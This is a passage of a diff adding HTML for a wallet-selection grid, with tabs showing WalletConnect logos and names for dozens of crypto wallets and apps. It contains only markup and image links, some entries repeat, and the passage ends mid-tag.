+                        <img alt="SafePal" src="https://explorer-api.walletconnect.com/v3/logo/lg/252753e7-b783-4e03-7f77-d39864530900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>SafePal</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="InfinityWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/9f259366-0bcd-4817-0af9-f78773e41900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>InfinityWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Crypto.com|DeFiWa..." src="https://explorer-api.walletconnect.com/v3/logo/lg/7c5ff577-a68d-49c5-02cd-3d83637b0b00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Crypto.com|DeFiWa...</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Valora" src="https://explorer-api.walletconnect.com/v3/logo/lg/a03bfa44-ce98-4883-9b2a-75e2b68f5700?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Valora</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="SecuX" src="https://explorer-api.walletconnect.com/v3/logo/lg/98183be0-3125-45ee-a6b6-fbd47ebefd00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>SecuX</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="AmbireWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/c39b3a16-1a38-4588-f089-cb7aeb584700?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>AmbireWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="RipioPortal" src="https://explorer-api.walletconnect.com/v3/logo/lg/fd56c695-ce58-4df5-1625-767571c80700?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>RipioPortal</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ByteBank" src="https://explorer-api.walletconnect.com/v3/logo/lg/bc7aacd6-b2e2-4146-7d21-06e0c5d44f00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ByteBank</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="VIVEWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/5ef7e40e-1f02-4da2-54bf-992e3e83e100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>VIVEWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="LOBSTRWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/0dafcaab-0852-47f7-85dd-436b86491d00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>LOBSTRWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MinervaWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/b57b2163-1bd8-4f6b-3311-470767e6d200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MinervaWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="BeeWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/f90bc33f-f085-40cf-7538-fae5ae84f900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>BeeWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Kriptonio" src="https://explorer-api.walletconnect.com/v3/logo/lg/363fae03-882a-4d81-a721-6e6f6e9ac500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Kriptonio</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ClingWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/2d8006c3-852b-458a-d6b0-916c5ba76800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ClingWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="CobaltWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/29d914e5-9daa-4342-33cd-169155c5a600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>CobaltWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Marble" src="https://explorer-api.walletconnect.com/v3/logo/lg/eb6de921-6824-4f35-6331-8a8b031e7100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Marble</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="PREMAWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/6487869b-1165-4f30-aa3a-115665be8300?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>PREMAWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="BinanceDeFiWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>BinanceDeFiWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="pier" src="https://explorer-api.walletconnect.com/v3/logo/lg/cf3f0da1-40ec-4940-aebe-df075513d100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Pier</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="trace-gift" src="https://explorer-api.walletconnect.com/v3/logo/lg/916c8480-a52d-4f4c-82b5-47cac8c84300?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Trace-gift</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Chain" src="https://explorer-api.walletconnect.com/v3/logo/lg/f9f3d8da-e791-47d2-98c2-031712617e00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Chain</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="IDPocket" src="https://explorer-api.walletconnect.com/v3/logo/lg/c227ee0a-5127-4707-ded9-c3cd81348d00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>IDPocket</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MetaMaskMobileDeve..." src="https://explorer-api.walletconnect.com/v3/logo/lg/cc7f87b2-4419-480a-fb39-c8364ece4600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MetaMaskMobileDeve...</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MonarchWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/c664d955-8a1e-4460-3917-4cfcf198f000?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ManarchWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="OttrFinance" src="https://explorer-api.walletconnect.com/v3/logo/lg/7025146c-c341-473f-a79c-62ec48eef800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>OttrFinance</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="RobinhoodWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/dfe0e3e3-5746-4e2b-12ad-704608531500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>RobinhoodWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Kriptomat" src="https://explorer-api.walletconnect.com/v3/logo/lg/774110aa-70f6-4d0c-210f-ab434838fa00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Kriptomat</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="UniPass" src="https://explorer-api.walletconnect.com/v3/logo/lg/77865965-4322-4ac4-5049-b2af11bf8300?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>UniPass</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Essentials" src="https://explorer-api.walletconnect.com/v3/logo/lg/058878f4-7364-4e01-434f-2cc09a15cf00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Essentials</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="JadeWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/280cd57b-24f4-4700-8d53-94fe292fab00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>JadeWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Keeper" src="https://explorer-api.walletconnect.com/v3/logo/lg/41f6ac85-8f4e-4d9f-b37b-92b43fa7f400?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Keeper</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Bitizen" src="https://explorer-api.walletconnect.com/v3/logo/lg/75dd1471-77e9-4811-ce57-ec8fc980ec00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Bitizen</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="XDEFIWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/efec6318-7f96-4b30-9287-6c287660cd00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>XDEFIWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="NeonWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/322bd6f0-09b5-4595-cb15-0dfab8054800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>NeonWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Blocto" src="https://explorer-api.walletconnect.com/v3/logo/lg/374258d3-c749-4f37-7815-77e61f798c00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Blocto</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Nova" src="https://pbs.twimg.com/profile_images/1598685297956585474/RTf32Evr_400x400.jpg">
+                    </div>
+                    <p>Nova</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Coin98SuperApp" src="https://explorer-api.walletconnect.com/v3/logo/lg/fc460647-ea95-447a-99f0-1bff8fa4be00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Coin98SuperApp</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="TimelessWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/32e89601-0490-42fc-0cc4-8627d62a2000?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>TimelessWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ArculusWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/f78dab27-7165-4a3d-fdb1-fcff06c0a700?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ArculusWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Broearn" src="https://explorer-api.walletconnect.com/v3/logo/lg/339b9e9d-e2a7-46eb-4ed3-272321257a00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Broearn</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MaskNetwork" src="https://explorer-api.walletconnect.com/v3/logo/lg/51fa27fd-8a21-4de0-c084-528e4a37ad00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MaskNetwork</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="SafeMoon" src="https://explorer-api.walletconnect.com/v3/logo/lg/ea0140c7-787c-43a4-838f-d5ab6a342000?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>SafeMoon</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Uniblow" src="https://explorer-api.walletconnect.com/v3/logo/lg/3aa86daa-b885-4686-c443-83355e1b3b00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Uniblow</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Lilico" src="https://explorer-api.walletconnect.com/v3/logo/lg/70c0bc88-7bb1-4c1f-3531-9a5f799fb100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Lilico</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="BridgeWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/20c3072e-c92e-4902-d4b9-cb2b6ab29100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>BridgeWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Fireblocks" src="https://explorer-api.walletconnect.com/v3/logo/lg/7e1514ba-932d-415d-1bdb-bccb6c2cbc00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Fireblocks</p>
+                </a>
+                
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="PlasmaWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/c268e78d-ffb0-4c8b-5cad-04c3add48500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>PlasmaWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="HoldstationWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/e6dba126-85af-4194-84f6-dd16632c3c00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>HoldstationWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="LeapCosmosWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/73e6b2b2-8c02-42e9-84f5-82a859978200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>LeapCosmosWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="D'CENTWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/c68b81d1-a400-4a07-6d9d-28edda986d00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>D'CENTWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Everspace" src="https://explorer-api.walletconnect.com/v3/logo/lg/80eaa630-6392-4b0a-a604-0a0f808e4d00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Everspace</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Cosmostation" src="https://explorer-api.walletconnect.com/v3/logo/lg/ea26c3c8-adb6-4dc4-ee02-35d6eee02800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Cosmostation</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MEWwallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/e2024511-2c9b-46d7-3111-52df3d241700?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MEWwallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="PLTwallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/a5d9dd15-8cef-42de-8bed-09e01a8b0200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>PLTwallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Avacus" src="https://explorer-api.walletconnect.com/v3/logo/lg/a7106965-91cc-4a73-4688-c5c72ae0ed00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Avacus</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="BCERTinwallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/e321346d-5ce7-4e75-371e-e4f0bf923900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>BCERTinwallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="InternetMoneyWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/fa800387-a0b6-41a9-b533-1dcd07067900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>InternetMoneyWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MetaOne" src="https://explorer-api.walletconnect.com/v3/logo/lg/b869d966-4699-44de-eadb-4eb39a580600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MetaOne</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="EnjinWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/add9626b-a5fa-4c12-178c-e5584e6dcd00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>EnjinWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="SlingshotWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/10c75467-6612-48ad-b97b-63985e922200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>SlingshotWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Gryfyn" src="https://explorer-api.walletconnect.com/v3/logo/lg/51bb1507-45a1-4d21-15f2-1cc2ebe69400?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Gryfyn</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="pier" src="https://explorer-api.walletconnect.com/v3/logo/lg/cf3f0da1-40ec-4940-aebe-df075513d100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Pier</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="CVLWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/e4eff15a-35d5-49fe-047f-33e331f46400?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>CVLWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Chain" src="https://explorer-api.walletconnect.com/v3/logo/lg/f9f3d8da-e791-47d2-98c2-031712617e00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Chain</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="BinanceDeFiWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/ebac7b39-688c-41e3-7912-a4fefba74600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>BinanceDeFiWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="CobaltWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/29d914e5-9daa-4342-33cd-169155c5a600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>CobaltWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="LOBSTRWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/0dafcaab-0852-47f7-85dd-436b86491d00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>LOBSTRWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="RipioPortal" src="https://explorer-api.walletconnect.com/v3/logo/lg/fd56c695-ce58-4df5-1625-767571c80700?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>RipioPortal</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Frontier" src="https://explorer-api.walletconnect.com/v3/logo/lg/a78c4d48-32c1-4a9d-52f2-ec7ee08ce200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Frontier</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="AT.Wallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/98bd3b9a-097e-4743-8808-986b4ad1ad00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>AT.Wallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="OptoWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/3df102e4-e435-49dd-d4b1-5ea74ebed500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>OptoWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="PREMAWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/6487869b-1165-4f30-aa3a-115665be8300?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>PREMAWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Marble" src="https://explorer-api.walletconnect.com/v3/logo/lg/eb6de921-6824-4f35-6331-8a8b031e7100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Marble</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ClingWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/2d8006c3-852b-458a-d6b0-916c5ba76800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ClingWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Kriptonio" src="https://explorer-api.walletconnect.com/v3/logo/lg/363fae03-882a-4d81-a721-6e6f6e9ac500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Kriptonio</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="VIVEWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/5ef7e40e-1f02-4da2-54bf-992e3e83e100?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>VIVEWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ByteBank" src="https://explorer-api.walletconnect.com/v3/logo/lg/bc7aacd6-b2e2-4146-7d21-06e0c5d44f00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ByteBank</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="MinervaWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/b57b2163-1bd8-4f6b-3311-470767e6d200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>MinervaWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="BeeWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/f90bc33f-f085-40cf-7538-fae5ae84f900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>BeeWallet</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ModularWalletProd" src="https://explorer-api.walletconnect.com/v3/logo/lg/70485da2-2568-463d-722c-25082997cc00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ModularWalletProd</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Torus" src="https://explorer-api.walletconnect.com/v3/logo/lg/1caa462e-dcf5-4c56-d180-094c81444f00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Torus</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="NitrogenWallet" src="https://explorer-api.walletconnect.com/v3/logo/lg/af185895-cda5-4eaf-e31b-28b6fe4b0800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>NitrogenWallet</p>
+                </a>
+                
+            </div>
+
+
+
+            
+            <div class="tabs appsrow hide">
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Zerion" src="https://explorer-api.walletconnect.com/v3/logo/lg/f216b371-96cf-409a-9d88-296392b85800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Zerion</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="UnstoppableDomains" src="https://explorer-api.walletconnect.com/v3/logo/lg/4725dda0-4471-4d0f-7adf-6bbe8b929c00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>UnstoppableDomains</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="DEXCoinApp" src="https://explorer-api.walletconnect.com/v3/logo/lg/1e8b0139-f516-4eb9-9038-1ea25795db00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>DEXCoinApp</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="NFTClue" src="https://explorer-api.walletconnect.com/v3/logo/lg/e8b0bd29-5933-4d1b-aabf-9c70e9f71200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>NFTClue</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ContributorCredits" src="https://explorer-api.walletconnect.com/v3/logo/lg/02238c0c-7fd9-4b89-646a-fbbae0e09b00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ContributorCredits</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Oraqle" src="https://explorer-api.walletconnect.com/v3/logo/lg/5256ba7e-78e2-4104-47ea-64fb08968200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Oraqle</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="WEB3JE" src="https://explorer-api.walletconnect.com/v3/logo/lg/36ab8eb1-24e8-46a7-7765-0c840f0dc200?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>WEB3JE</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Zoksh" src="https://explorer-api.walletconnect.com/v3/logo/lg/01771272-b6af-46e3-ad69-00e52de54900?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Zoksh</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="ThetaRarity" src="https://explorer-api.walletconnect.com/v3/logo/lg/320a77bc-9dd9-44fb-0309-7fc176e1e500?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>ThetaRarity</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Altr" src="https://explorer-api.walletconnect.com/v3/logo/lg/7f880920-c32b-4f7d-8e9f-ab48f0556600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Altr</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="TraderDAO" src="https://explorer-api.walletconnect.com/v3/logo/lg/cd2574fb-fcf7-4310-0d6f-ce56f6a64800?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>TraderDAO</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="THORSwap" src="https://explorer-api.walletconnect.com/v3/logo/lg/4dc14f23-9d37-419c-12c2-11bc14960600?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>THORSwap</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="DeltaOne" src="https://explorer-api.walletconnect.com/v3/logo/lg/11ac53de-cfdc-40a9-49b0-b409d5619e00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>DeltaOne</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="0xPlasmaFinance" src="https://explorer-api.walletconnect.com/v3/logo/lg/0b442c16-962d-4de8-a575-968899cb3d00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>0xPlasmaFinance</p>
+                </a>
+
+<!--
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Ektawalletweb" src="https://explorer-api.walletconnect.com/v3/logo/lg/d292290e-580a-48b1-7ab0-f35fec878b00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Ektawalletweb</p>
+                </a>
+-->
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="LensClaiming" src="https://explorer-api.walletconnect.com/v3/logo/lg/4c9fc1b1-d3b9-4967-4d82-b3ae20594400?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>LensClaiming</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
+                        <img alt="Socrates-dev" src="https://explorer-api.walletconnect.com/v3/logo/lg/0f62cfa7-e5d4-4f91-67df-ca70c1d23f00?projectId=2f05ae7f1116030fde2d36508f472bfb">
+                    </div>
+                    <p>Socrates-dev</p>
+                </a>
+
+                <a href="#" class="tab">
+                    <div class="img">
